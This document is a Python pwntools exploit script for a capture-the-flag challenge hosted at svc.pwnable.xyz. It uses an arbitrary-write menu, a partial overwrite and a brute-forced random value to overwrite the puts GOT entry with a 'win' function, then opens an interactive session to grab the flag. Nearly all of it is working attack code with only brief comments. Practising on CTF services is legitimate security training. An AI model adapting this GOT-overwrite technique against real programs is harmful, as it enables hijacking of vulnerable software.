###partial overwrite and brute force random

from pwn import *

###Util
def arb_write(addr,val):
    r.sendlineafter('> ','1')
    if b'Door' in r.recvuntil(('Door','Menu')):
        print('!')
        r.sendlineafter(': ',str(val))
        r.sendlineafter('Realm: ',str(addr))
        return 1
    else:
        return 0

def set_val(addr):
    r.sendlineafter('> ','2')
    r.sendlineafter('Realm: ',str(addr))

def clear_addr(addr):
    set_val(addr)
    r.sendlineafter('> ','3')

def trigger_puts():
    r.sendlineafter('> ','0')

###Addr
stdout_lock_offset = 0x1bf3e0
door_higher = 0x601244+1
puts_got = 0x601018
win = 0x400969


###Exploit
###time out is a bit short, so retry untill success
while True:
    try:
        r = remote('svc.pwnable.xyz',30039)
        ###partial overwrite door to make random num < 256
        clear_addr(door_higher)
        ###clear higher bytes of puts_got
        clear_addr(puts_got+4)
        ###brute force door value and overwrite puts_got lower bytes
        for i in range(0x100):
            print(i)
            set_val(i)
            if arb_write(puts_got,win)==1:
                break
        ###get flag
        trigger_puts()
        r.interactive()
        break
    except:
        r.close()
